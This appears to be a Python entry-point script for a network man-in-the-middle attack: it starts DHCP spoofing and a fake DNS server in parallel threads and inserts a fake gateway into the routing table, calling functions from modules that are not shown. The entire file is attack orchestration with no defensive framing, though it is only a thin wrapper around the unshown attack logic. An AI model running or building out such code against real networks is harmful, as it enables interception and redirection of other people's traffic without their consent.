import threading
import os
from dhcp_spoofing import start_dhcp_spoofing
from fake_dns_server import start_dns_server
from routing_control import add_fake_gateway, show_routes

def run_dhcp_spoofing():
    start_dhcp_spoofing()

def run_dns_server():
    start_dns_server()

def configure_routing():
    print("Current routing table:")
    show_routes()
    print("\nAdding fake gateway...")
    add_fake_gateway()
    print("New routing table:")
    show_routes()

if __name__ == "__main__":
    # Start DHCP spoofing in a separate thread
    dhcp_thread = threading.Thread(target=run_dhcp_spoofing)
    dhcp_thread.start()

    # Start DNS server in a separate thread
    dns_thread = threading.Thread(target=run_dns_server)
    dns_thread.start()

    # Configure routing
    configure_routing()

    # Wait for threads to finish
    dhcp_thread.join()
    dns_thread.join()
